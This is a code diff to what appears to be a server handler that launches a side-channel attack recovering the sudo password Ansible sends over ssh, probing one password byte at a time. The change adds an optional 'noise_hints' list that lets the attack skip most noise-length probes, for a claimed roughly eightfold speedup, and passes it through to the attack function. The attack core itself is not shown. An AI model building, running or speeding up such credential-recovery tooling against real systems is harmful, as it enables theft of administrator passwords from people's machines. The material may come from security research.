@@ -339,6 +339,18 @@ async def handle_run_attack_ansible(request: web.Request) -> web.Response:
     settle = float(body.get("settle", 0.1))
     min_margin = int(body.get("min_margin", 8))
     max_rounds = int(body.get("max_rounds", 96))
+    # Optional: a per-position list of noise-length hints.  For byte
+    # position `i < len(noise_hints)` the attack probes only the
+    # single noise length `noise_hints[i]` instead of running the
+    # full 8-noise sweep -- an ~8x speedup per hinted position.
+    # Positions at or beyond `len(noise_hints)` fall back to the
+    # full 8-noise sweep automatically.  Callers normally harvest
+    # a prior run's `significant_noises` response field and feed it
+    # back in here.  Leave unset (None) for the default "probe all
+    # 8 noise lengths at every position" mode.
+    noise_hints = body.get("noise_hints")
+    if noise_hints is not None:
+        noise_hints = [int(nl) for nl in noise_hints]
     # Default terminator: '\n' (byte 0x0a).  Ansible appends a newline
     # to the sudo password when writing it to ssh's stdin, so the
     # password on the wire is "<password>\n" and '\n' is the natural
@@ -349,9 +361,9 @@ async def handle_run_attack_ansible(request: web.Request) -> web.Response:
 
     LOG.info(
         "HTTP /run_attack_ansible: prefix=%r alphabet_size=%d max=%d "
-        "min_margin=%d max_rounds=%d terminator=%r",
+        "min_margin=%d max_rounds=%d terminator=%r noise_hints=%s",
         known_prefix, len(alphabet), max_length, min_margin, max_rounds,
-        terminator,
+        terminator, noise_hints,
     )
     try:
         result = await run_ansible_attack(
@@ -364,6 +376,7 @@ async def handle_run_attack_ansible(request: web.Request) -> web.Response:
             settle=settle,
             min_margin=min_margin,
             max_rounds=max_rounds,
+            noise_hints=noise_hints,
         )
     except Exception as exc:  # noqa: BLE001
         LOG.exception("ansible attack failed")
